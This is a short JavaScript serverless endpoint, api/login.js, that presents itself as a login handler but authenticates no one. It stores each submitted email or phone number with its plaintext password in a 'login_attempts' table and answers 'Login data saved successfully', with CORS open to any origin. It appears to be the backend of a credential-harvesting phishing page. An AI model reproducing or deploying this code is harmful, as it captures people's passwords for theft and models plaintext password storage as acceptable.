// api/login.js
import { neon } from "@neondatabase/serverless";

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res
      .status(405)
      .json({ success: false, message: "Method not allowed" });
  }

  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: "Please enter email/phone and password",
      });
    }

    // Validate format
    const emailOrPhone = email.trim();
    if (emailOrPhone.includes("@")) {
      // Email - just check it has @
    } else {
      // Phone - must be 11 digits
      if (!/^\d{11}$/.test(emailOrPhone)) {
        return res.status(400).json({
          success: false,
          message: "Phone number must be exactly 11 digits",
        });
      }
    }

    // Connect to database using Neon
    const sql = neon(process.env.DATABASE_URL);

    // Save to database
    await sql`
      INSERT INTO login_attempts (email_or_phone, password, created_at)
      VALUES (${email}, ${password}, NOW())
    `;

    return res.status(200).json({
      success: true,
      message: "Login data saved successfully",
    });
  } catch (error) {
    console.error("Error:", error);
    return res.status(500).json({
      success: false,
      message: "Server error: " + error.message,
    });
  }
}
